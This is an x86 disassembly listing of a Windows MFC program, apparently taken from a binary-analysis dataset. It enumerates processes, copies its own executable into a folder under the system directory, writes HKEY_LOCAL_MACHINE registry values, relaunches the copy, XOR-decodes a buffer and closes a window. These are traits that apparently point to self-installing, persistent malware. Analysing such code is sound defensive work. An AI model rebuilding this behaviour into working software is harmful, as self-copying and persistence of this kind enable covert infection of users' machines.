mov ecx [ esp + 0xc ]
sub ecx eax
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_408800
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
retn 0xc
mov al [ esp + 0x8 ]
push ebx
mov bl al
mov edx ecx
mov bh bl
push edi
mov edi [ esp + 0xc ]
mov eax ebx
shl eax 0x10
mov ax bx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop ebx
sub_408840
sub esp 0x58
lea eax [ esp ]
push ebx
push ebp
push esi
push edi
mov ebx ecx
push eax
call sub_407c80
mov ebp [ esp + 0x6c ]
xor edi edi
mov ecx [ esp + 0x74 ]
lea eax [ esp + 0x10 ]
push eax
push ecx
mov ecx ebx
call sub_407d70
pop edi
pop esi
pop ebp
pop ebx
add esp 0x58
retn 0xc
cmp esi 0x400
jbe r-xdata
lea ecx [ edi + ebp ]
push esi
lea edx [ esp + 0x14 ]
push ecx
push edx
mov ecx ebx
call sub_407cb0
add edi esi
jmp r-xdata
mov esi 0x400
mov esi [ esp + 0x70 ]
sub esi edi
je r-xdata
sub_4088a0
push 0xffffffff
push sub_40e1ff
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push sub_4089e0
push sub_408990
push 0x200
lea eax [ esi + 0x4 ]
push 0x14
push eax
mov [ esp + 0x18 ] esi
call sub_40d3e3
push Ordinal_MFC42_800
push Ordinal_MFC42_540
push 0x200
lea ecx [ esi + 0x2804 ]
push 0x4
push ecx
mov [ esp + 0x24 ] 0x0
call sub_40d3e3
push Ordinal_MFC42_800
push Ordinal_MFC42_540
push 0x200
lea edx [ esi + 0x300c ]
push 0x4
push edx
mov [ esp + 0x24 ] 0x1
call sub_40d3e3
push Ordinal_MFC42_800
push Ordinal_MFC42_540
push 0x200
lea eax [ esi + 0x380c ]
push 0x4
push eax
mov [ esp + 0x24 ] 0x2
call sub_40d3e3
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x3004 ] 0x0
mov [ esi + 0x3008 ] 0x0
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_408990
push 0xffffffff
push sub_40e218
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call Ordinal_MFC42_540
lea ecx [ esi + 0x4 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_540
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4089e0
push 0xffffffff
push sub_40e238
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x4 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_800
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_408a30
push 0xffffffff
push sub_40e29f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
push Ordinal_MFC42_800
push 0x200
lea eax [ esi + 0x380c ]
push 0x4
push eax
mov [ esp + 0x20 ] 0x2
call sub_40d2ef
push Ordinal_MFC42_800
push 0x200
lea ecx [ esi + 0x300c ]
push 0x4
push ecx
mov [ esp + 0x20 ] 0x1
call sub_40d2ef
push Ordinal_MFC42_800
push 0x200
lea edx [ esi + 0x2804 ]
push 0x4
push edx
mov [ esp + 0x20 ] 0x0
call sub_40d2ef
push sub_4089e0
push 0x200
add esi 0x4
push 0x14
push esi
mov [ esp + 0x20 ] 0xffffffff
call sub_40d2ef
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_408ae0
push esi
lea esi [ ecx + 0x3004 ]
push esi
add ecx 0x400c
push 0x800
push ecx
call EnumProcesses
test eax eax
jne r-xdata
mov eax [ esi ]
shr eax 0x2
mov [ esi ] eax
mov eax 0x1
pop esi
retn
pop esi
retn
sub_408b10
sub esp 0x110
mov eax [ ecx + 0x3004 ]
push ebp
xor ebp ebp
mov [ esp + 0x4 ] ecx
test eax eax
jle r-xdata
mov eax 0x1
pop ebp
add esp 0x110
retn
push ebx
mov ebx [ CloseHandle@IAT ]
push esi
push edi
lea edi [ ecx + 0x300c ]
cmp eax 0x4
je r-xdata
push rw-data
jmp r-xdata
push rw-data
cmp eax 0x8
je r-xdata
push edi
call Ordinal_MFC42_2818
add esp 0x8
mov eax [ edi + 0x1000 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov eax 0x1
pop ebp
add esp 0x110
retn
push eax
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x14 ]
push eax
push 0x4
push ecx
push esi
call EnumProcessModules
test eax eax
je r-xdata
push rw-data
jmp r-xdata
push rw-data
push edi
call Ordinal_MFC42_2818
add esp 0x8
push esi
call ebx
jmp r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push 0x104
push edx
push eax
push esi
call GetModuleBaseNameA
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
inc ebp
add edi 0x4
cmp ebp [ edx + 0x3004 ]
jl r-xdata
lea ecx [ esp + 0x1c ]
push ecx
push rw-data
push edi
call Ordinal_MFC42_2818
add esp 0xc
push esi
call ebx
jmp r-xdata
sub_408c10
push 0xffffffff
push sub_40e2d1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x33c
push edi
mov edi ecx
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1c ] edi
call Ordinal_MFC42_540
mov ecx [ edi + 0x3004 ]
xor eax eax
cmp ecx eax
mov [ esp + 0x348 ] eax
mov [ esp + 0x10 ] eax
jle r-xdata
lea ecx [ esp + 0x4 ]
mov [ esp + 0x348 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x340 ]
mov eax 0x1
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x348
retn
push ebx
lea eax [ edi + 0x380c ]
push ebp
mov ebp [ _stricmp@IAT ]
push esi
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
mov ecx [ edi + 0x3004 ]
inc eax
add edx 0x4
cmp eax ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
jl r-xdata
lea eax [ esp + 0x3c ]
lea ecx [ esp + 0x38 ]
push eax
push 0x4
push ecx
push esi
call EnumProcessModules
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ ecx + 0x800 ]
push edx
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x24 ] esi
je r-xdata
pop esi
pop ebp
pop ebx
mov eax [ esp + 0x38 ]
lea edx [ esp + 0x144 ]
push 0x10810
push edx
push eax
push esi
call GetModuleFileNameExA
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x40 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x144 ]
push ecx
push rw-data
push edx
call Ordinal_MFC42_2818
add esp 0xc
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x10 ]
push 0x4
push eax
call Ordinal_MFC42_4129
mov ecx [ eax ]
push rw-data
push ecx
call ebp
add esp 0x8
lea ecx [ esp + 0x30 ]
test eax eax
sete bl
call Ordinal_MFC42_800
test bl bl
je r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
lea edx [ esp + 0x248 ]
push 0x104
push edx
call [ GetWindowsDirectoryA@IAT ]
test eax eax
je r-xdata
push 0x4
push 0x0
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_6648
lea eax [ esp + 0x40 ]
push 0x104
push eax
push 0x0
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_2915
push eax
call [ GetLongPathNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x2c ]
push 0xc
push eax
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_4129
mov ecx [ eax ]
push rw-data
push ecx
call ebp
add esp 0x8
lea ecx [ esp + 0x2c ]
test eax eax
sete bl
call Ordinal_MFC42_800
test bl bl
je r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x40 ]
push edx
push rw-data
push eax
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_2915
mov ecx [ esp + 0x18 ]
push eax
push rw-data
push ecx
jmp r-xdata
push 0xc
push 0x0
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_6648
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_540
lea edx [ esp + 0x248 ]
lea eax [ esp + 0x14 ]
push edx
push rw-data
push eax
mov [ esp + 0x360 ] 0x1
call Ordinal_MFC42_2818
add esp 0xc
lea ecx [ esp + 0x20 ]
push 0x1
push ecx
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_5710
mov edx [ eax ]
push rw-data
push edx
call ebp
add esp 0x8
lea ecx [ esp + 0x20 ]
mov esi eax
call Ordinal_MFC42_800
test esi esi
je r-xdata
call Ordinal_MFC42_2818
mov ecx [ esp + 0x30 ]
add esp 0xc
push ecx
call [ CloseHandle@IAT ]
mov edi [ esp + 0x28 ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
lea edx [ esp + 0x38 ]
push ecx
push edx
call Ordinal_MFC42_922
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x358 ] 0x2
call Ordinal_MFC42_858
lea ecx [ esp + 0x34 ]
mov [ esp + 0x354 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x354 ] 0x0
call Ordinal_MFC42_800
push rw-data
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_941
sub_408f10
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor eax eax
push esi
push edi
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov edx 0x1
mov ecx [ rw-data ]
sub ecx 0x9
shl edx cl
sub edx 0x1
mov [ ebp - 0x10 ] edx
mov edi [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ edi ] edx
add edi 0x4
mov [ ebp + 0x10 ] edi
xor edi edi
xor esi esi
dec ecx
add esi ecx
mov [ ebp + 0x8 ] esi
pop esi
cmp ecx 0x1
jne r-xdata
cmp ecx [ ebp - 0x10 ]
ja r-xdata
mov ebx ecx
shl ebx 0x8
mov bl al
mov ecx [ rw-data ]
xor ebx ebx
mov bh 0x1
mov bl al
mov ecx 0x9
jmp r-xdata
cmp al [ esi + ecx ]
lea ecx [ ecx + 0x1 ]
lea edx [ edx - 0x1 ]
je r-xdata
shl esi cl
or esi ebx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub edi 0x20
sub ecx edi
mov [ ebp - 0xc ] ebx
push ecx
mov ecx edi
shr ebx cl
pop ecx
mov [ ebp - 0x8 ] 0x1
add edi ecx
cmp edi 0x20
jle r-xdata
cmp edx 0x0
je r-xdata
cmp edx 0x0
je r-xdata
mov eax esi
push edi
mov edi [ ebp + 0x10 ]
mov [ edi ] eax
add edi 0x4
mov [ ebp + 0x10 ] edi
pop edi
add [ ebp - 0x4 ] 0x4
mov eax 0x20
sub eax edi
mov ecx eax
mov eax [ ebp - 0xc ]
shl eax cl
shr eax cl
mov esi eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
cmp edi 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x20
sub eax edi
mov ecx eax
shl esi cl
mov eax esi
mov edi [ ebp + 0x10 ]
mov [ edi ] eax
add [ ebp - 0x4 ] 0x4
push esi
mov esi [ ebp + 0x8 ]
mov al [ esi ]
mov ecx 0x1
sub_4090a0
push 0xffffffff
push sub_40e2e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov eax [ esi + 0xc8 ]
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
mov ecx [ esi + 0xcc ]
test ecx ecx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov ecx [ esi + 0xd0 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_815
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov edx [ ecx ]
push 0x1
call [ edx ]
sub_409120
push 0xffffffff
push sub_40e318
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x4 ]
push eax
mov eax [ esp + 0x1c ]
push ecx
push 0x0
push 0x20007
push 0x0
push 0x0
push 0x0
push edx
push eax
mov [ esp + 0x34 ] 0x2
mov [ esp + 0x28 ] 0x0
call [ RegCreateKeyExA@IAT ]
mov ecx [ esp + 0x24 ]
mov esi [ esp + 0x20 ]
mov eax [ ecx - 0x8 ]
lea ecx [ esp + 0x24 ]
push eax
push eax
call Ordinal_MFC42_2915
mov edx [ esp + 0x8 ]
push eax
push 0x1
push 0x0
push esi
push edx
call [ RegSetValueExA@IAT ]
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x20 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x24 ]
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x10
sub_4091e0
push 0xffffffff
push sub_40e367
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
mov [ esp + 0xc ] 0x0
lea ecx [ esp + 0x8 ]
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x10 ] 0xff
call Ordinal_MFC42_540
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x2c ]
lea eax [ esp + 0x14 ]
mov bl 0x3
push eax
push 0x20019
push 0x0
push ecx
push edx
mov [ esp + 0x34 ] bl
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call Ordinal_MFC42_823
mov edx [ esp + 0x38 ]
add esp 0x4
lea ecx [ esp + 0x10 ]
mov esi eax
mov eax [ esp + 0x14 ]
push ecx
push esi
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
mov esi [ esp + 0x28 ]
push rw-data
mov ecx esi
call Ordinal_MFC42_537
mov ebx 0x1
mov [ esp + 0xc ] ebx
jmp r-xdata
call Ordinal_MFC42_1158
mov ecx [ eax ]
push esi
mov [ esp + 0x30 ] ecx
lea ecx [ esp + 0x30 ]
call Ordinal_MFC42_860
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x8 ]
push edx
mov [ esp + 0x24 ] 0x4
call Ordinal_MFC42_858
lea ecx [ esp + 0x2c ]
mov [ esp + 0x20 ] bl
call Ordinal_MFC42_800
push esi
call Ordinal_MFC42_825
mov eax [ esp + 0x18 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
mov esi [ esp + 0x28 ]
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call Ordinal_MFC42_535
mov esi [ esp + 0x28 ]
push rw-data
mov ecx esi
call Ordinal_MFC42_537
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x20 ] 0x2
call Ordinal_MFC42_800
lea ecx [ esp + 0x30 ]
mov [ esp + 0x20 ] bl
call Ordinal_MFC42_800
lea ecx [ esp + 0x34 ]
mov [ esp + 0x20 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x18 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0x10
mov ebx 0x1
mov [ esp + 0xc ] ebx
sub_409340
push 0xffffffff
push sub_40e388
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
lea ecx [ esp + 0x14 ]
lea edx [ esp ]
xor eax eax
push ecx
mov ecx [ esp + 0x18 ]
push edx
push eax
push 0x20007
push eax
push eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] eax
push eax
mov eax [ esp + 0x34 ]
push eax
push ecx
call [ RegCreateKeyExA@IAT ]
mov edx [ esp + 0x1c ]
mov eax [ esp ]
push edx
push eax
call [ RegDeleteValueA@IAT ]
mov ecx [ esp ]
push ecx
call [ RegCloseKey@IAT ]
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_800
lea ecx [ esp + 0x1c ]
mov [ esp + 0xc ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0xc
sub_409410
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40e3c7
push eax
mov [ fs : 0x0 ] esp
sub esp 0x90
push esi
push edi
xor edi edi
mov esi ecx
push edi
call Ordinal_MFC42_1247
test eax eax
je r-xdata
mov ecx [ esp + 0x98 ]
pop edi
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x9c
retn
push 0xdc
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x8 ] eax
cmp eax edi
mov [ esp + 0xa0 ] edi
je r-xdata
xor eax eax
mov ecx eax
call sub_401000
jmp r-xdata
xor eax eax
mov ecx eax
call sub_403220
jmp r-xdata
push 0x34
mov [ esp + 0xa4 ] 0xffffffff
mov [ esi + 0xcc ] eax
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x8 ] eax
cmp eax edi
mov [ esp + 0xa0 ] 0x1
je r-xdata
push rw-data
push edi
push edi
call [ CreateMutexA@IAT ]
mov [ esi + 0xc8 ] eax
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov ecx esi
mov [ esp + 0xa0 ] 0xffffffff
mov [ esi + 0xd0 ] eax
call sub_40a2f0
mov ecx esi
call sub_409e70
mov ecx esi
call sub_4095a0
test eax eax
jne r-xdata
lea eax [ esp + 0xc ]
push edi
lea ecx [ esi + 0xc4 ]
push eax
push ecx
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
call GdiplusStartup
push 0x1
call sub_40a180
push 0x1
call sub_40a230
add esp 0x8
mov ecx esi
call Ordinal_MFC42_2621
push edi
lea ecx [ esp + 0x20 ]
call sub_40a510
lea edx [ esp + 0x1c ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0xa0 ] 0x2
mov [ esi + 0x20 ] edx
call Ordinal_MFC42_2514
lea ecx [ esp + 0x1c ]
mov [ esp + 0xa0 ] 0xffffffff
call Ordinal_MFC42_641
mov [ esi + 0xc8 ] edi
jmp r-xdata
sub_4095a0
push 0xffffffff
push sub_40e4d2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x818
push ebx
push ebp
mov ebp ecx
push esi
push edi
lea ecx [ esp + 0x30 ]
mov [ esp + 0x34 ] ebp
call Ordinal_MFC42_540
lea ecx [ esp + 0x14 ]
mov [ esp + 0x830 ] 0x0
call Ordinal_MFC42_540
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0xf5 ]
mov [ esp + 0xf4 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x40d ]
mov [ esp + 0x40c ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x50d ]
mov [ esp + 0x50c ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x30d ]
mov [ esp + 0x30c ] 0x0
[ edi ]
stosw [ edi ]
push 0x104
push 0x104
lea ecx [ esp + 0x38 ]
mov [ esp + 0x838 ] 0x1
stosb [ edi ]
call Ordinal_MFC42_2919
push eax
call [ GetSystemDirectoryA@IAT ]
mov eax [ esp + 0x30 ]
lea ecx [ esp + 0x724 ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
lea edx [ esp + 0x318 ]
lea eax [ esp + 0x518 ]
push edx
lea ecx [ esp + 0x41c ]
push eax
lea edx [ esp + 0x108 ]
push ecx
lea eax [ esp + 0x73c ]
push edx
push eax
call [ _splitpath@IAT ]
add esp 0x20
lea ecx [ esp + 0xf4 ]
push ecx
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_860
push rw-data
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_941
mov edx [ esp + 0x14 ]
mov esi [ CreateDirectoryA@IAT ]
push 0x0
push edx
call esi
push ecx
mov ecx esp
mov [ esp + 0x14 ] esp
push rw-data
call Ordinal_MFC42_537
lea eax [ esp + 0x14 ]
push eax
call sub_40abd0
add esp 0x8
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x834 ] 0x2
call Ordinal_MFC42_939
lea ecx [ esp + 0x10 ]
mov [ esp + 0x830 ] 0x1
call Ordinal_MFC42_800
mov ecx [ esp + 0x14 ]
push 0x0
push ecx
call esi
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_540
push 0x104
push 0x104
lea ecx [ esp + 0x20 ]
mov [ esp + 0x838 ] 0x3
call Ordinal_MFC42_2919
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0xffffffff
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_5572
push 0x5c
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_5683
lea edx [ esp + 0x38 ]
push eax
push edx
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_4129
mov esi [ esp + 0x38 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x830 ] 0x4
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x75 ]
mov [ esp + 0x74 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x74 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x74 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
lea ecx [ esp + 0x38 ]
mov [ esp + 0x830 ] 0x3
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x830 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x830 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x30 ]
mov [ esp + 0x830 ] 0xffffffff
call Ordinal_MFC42_800
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ ebp + 0xcc ]
push ecx
add eax 0x38
mov ecx esp
mov [ esp + 0x14 ] esp
push eax
call Ordinal_MFC42_535
lea ecx [ esp + 0x44 ]
push ecx
call sub_40abd0
mov edx [ ebp + 0xcc ]
add esp 0x4
add edx 0x3c
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
mov [ esp + 0x838 ] 0x5
call Ordinal_MFC42_535
lea eax [ esp + 0x30 ]
push eax
call sub_40abd0
add esp 0x8
push 0x5
mov [ esp + 0x834 ] 0x6
call [ GetDesktopWindow@IAT ]
mov ebp [ GetWindow@IAT ]
push eax
call ebp
push 0x0
push eax
call ebp
push eax
call Ordinal_MFC42_2864
mov edi eax
test edi edi
je r-xdata
mov dl [ esp + eax + 0x74 ]
xor dl 0xb5
mov [ esp + eax + 0x54 ] dl
inc eax
cmp eax ecx
jl r-xdata
mov ecx [ esp + 0x828 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x824
retn
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
lea edx [ esp + 0x14 ]
push rw-data
lea eax [ esp + 0x14 ]
push edx
push eax
call Ordinal_MFC42_924
push ecx
lea edx [ esp + 0x30 ]
mov ecx esp
mov [ esp + 0x40 ] esp
push edx
mov bl 0x12
push eax
push ecx
mov [ esp + 0x840 ] bl
call Ordinal_MFC42_922
push ecx
lea eax [ esp + 0x48 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push eax
mov [ esp + 0x83c ] 0x13
call Ordinal_MFC42_535
push ecx
mov [ esp + 0x83c ] 0x14
mov esi esp
mov [ esp + 0x34 ] esp
push ecx
mov ecx esp
mov [ esp + 0x38 ] esp
push rw-data
call Ordinal_MFC42_537
push esi
call sub_40abd0
mov ecx [ esp + 0x48 ]
add esp 0x8
mov [ esp + 0x83c ] bl
push 0x80000002
call sub_409120
lea ecx [ esp + 0x10 ]
mov [ esp + 0x830 ] 0x6
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
push rw-data
lea edx [ esp + 0x20 ]
push ecx
push edx
call Ordinal_MFC42_924
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x10 ]
push ecx
push eax
push edx
mov [ esp + 0x83c ] 0x15
call Ordinal_MFC42_922
mov eax [ eax ]
push 0x0
push eax
mov eax [ esp + 0x20 ]
push eax
call [ CopyFileA@IAT ]
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_800
lea ecx [ esp + 0x1c ]
mov [ esp + 0x830 ] 0x6
call Ordinal_MFC42_800
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x2c ]
push 0x1
push ecx
push 0x0
push edx
push 0x0
push 0x0
call [ ShellExecuteA@IAT ]
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_540
lea ecx [ esp + 0x24 ]
mov [ esp + 0x830 ] 0x7
push ecx
mov ecx edi
call Ordinal_MFC42_3874
lea edx [ esp + 0x10 ]
push 0xe
push edx
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_4129
mov eax [ eax ]
mov esi rw-data
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_540
lea ecx [ esp + 0x20 ]
mov [ esp + 0x830 ] 0x8
call Ordinal_MFC42_540
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x10 ]
mov bl 0x9
mov eax [ ecx - 0x8 ]
lea ecx [ esp + 0x24 ]
add eax 0xffffffef
mov [ esp + 0x830 ] bl
push eax
push edx
call Ordinal_MFC42_5710
push eax
lea ecx [ esp + 0x2c ]
mov [ esp + 0x834 ] 0xa
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x830 ] bl
call Ordinal_MFC42_800
push ecx
lea eax [ esp + 0x2c ]
mov ecx esp
mov [ esp + 0x20 ] esp
push eax
call Ordinal_MFC42_535
push ecx
mov [ esp + 0x838 ] 0xb
mov esi esp
mov [ esp + 0x44 ] esp
push ecx
mov ecx esp
mov [ esp + 0x48 ] esp
push rw-data
call Ordinal_MFC42_537
push esi
call sub_40abd0
add esp 0x8
lea ecx [ esp + 0x18 ]
mov [ esp + 0x838 ] bl
push 0x80000002
push ecx
mov ecx [ esp + 0x44 ]
call sub_4091e0
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x834 ] 0xc
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x830 ] bl
call Ordinal_MFC42_800
mov eax [ esp + 0x20 ]
lea edx [ esp + 0x60c ]
push edx
push eax
call Ordinal_MFC42_3790
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x1f4 ]
push ecx
push edx
call Ordinal_MFC42_3790
mov eax [ esp + 0x618 ]
mov ecx [ esp + 0x200 ]
cmp eax ecx
jne r-xdata
mov eax [ edi + 0x20 ]
push 0x2
push eax
call ebp
push eax
call Ordinal_MFC42_2864
lea ecx [ esp + 0x24 ]
mov edi eax
mov [ esp + 0x830 ] 0x6
call Ordinal_MFC42_800
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ edi + 0x20 ]
push 0x0
push 0x0
push 0x10
push eax
call [ PostMessageA@IAT ]
push ecx
lea edx [ esp + 0x2c ]
mov ecx esp
mov [ esp + 0x40 ] esp
push edx
call Ordinal_MFC42_535
push ecx
mov [ esp + 0x838 ] 0x11
